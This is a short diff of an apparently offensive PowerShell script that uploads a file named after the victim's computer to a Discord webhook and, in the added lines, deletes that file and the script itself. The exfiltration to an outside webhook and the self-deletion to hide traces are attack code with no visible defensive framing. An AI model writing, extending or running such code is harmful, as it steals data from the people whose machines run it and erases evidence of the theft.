@@ -50,4 +50,5 @@ Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -
 upload_discord("$env:computername.fk")
 
 ## Self Delete
-## Remove-Item $PSCommandPath -Force 
+Remove-Item ./"$env:computername.fk"
+Remove-Item $PSCommandPath -Force 
